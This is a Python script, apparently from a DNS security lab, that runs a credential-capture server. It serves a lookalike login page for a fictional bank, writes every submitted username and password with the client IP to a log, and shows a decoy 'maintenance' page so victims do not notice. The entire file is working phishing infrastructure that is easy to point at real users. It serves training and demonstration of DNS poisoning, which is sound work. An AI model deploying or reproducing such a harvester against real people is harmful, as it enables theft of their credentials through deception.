#!/usr/bin/env python3
"""Tiny credential-capture server for the DNS Security Lab.

Serves the lookalike Northwind Bank login page and records anything POSTed to
the login form. This stands in for the "attacker-controlled host" that a
poisoned DNS record points victims at.

- GET  /            -> the lookalike login page (index.html)
- POST /login       -> append the submitted credentials to the capture log,
                       then return a bland "maintenance" page so the victim
                       does not immediately realise anything is wrong.

Captured submissions are appended to CAPTURE_LOG (default /opt/dns-lab/captured.log).
Nothing here talks to the real Northwind Bank — there isn't one. It is fictional.
"""

import os
import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

WEB_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_LOG = os.environ.get("CAPTURE_LOG", "/opt/dns-lab/captured.log")
PORT = int(os.environ.get("CAPTURE_PORT", "8080"))

MAINTENANCE_PAGE = b"""<!doctype html>
<html><head><meta charset="utf-8"><title>Northwind Bank</title></head>
<body style="font-family:sans-serif;max-width:420px;margin:80px auto;color:#1a2733">
<h2>We'll be right back</h2>
<p>Online Banking is temporarily unavailable for scheduled maintenance.
Please try again shortly.</p>
<p style="color:#8a99a8;font-size:12px">Northwind Bank (fictional) &mdash; security training environment.</p>
</body></html>"""


class Handler(BaseHTTPRequestHandler):
    # Quiet the default stderr request logging; the capture log is what matters.
    def log_message(self, *args):
        pass

    def _send(self, status, body, content_type="text/html; charset=utf-8"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        index = os.path.join(WEB_DIR, "index.html")
        try:
            with open(index, "rb") as fh:
                body = fh.read()
        except OSError:
            body = b"<h1>Northwind Bank</h1><p>Login page unavailable.</p>"
        self._send(200, body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        fields = parse_qs(raw)
        username = (fields.get("username", [""])[0]).strip()
        password = (fields.get("password", [""])[0]).strip()

        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client = self.client_address[0]
        line = f"[{stamp}] CAPTURED from {client} -> username={username!r} password={password!r}\n"
        try:
            with open(CAPTURE_LOG, "a", encoding="utf-8") as fh:
                fh.write(line)
        except OSError:
            pass

        # Return a harmless-looking page so the "victim" is not tipped off.
        self._send(200, MAINTENANCE_PAGE)


def main():
    os.chdir(WEB_DIR)
    server = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    print(f"[capture] serving lookalike page + capturing credentials on :{PORT}")
    print(f"[capture] submissions -> {CAPTURE_LOG}")
    server.serve_forever()


if __name__ == "__main__":
    main()
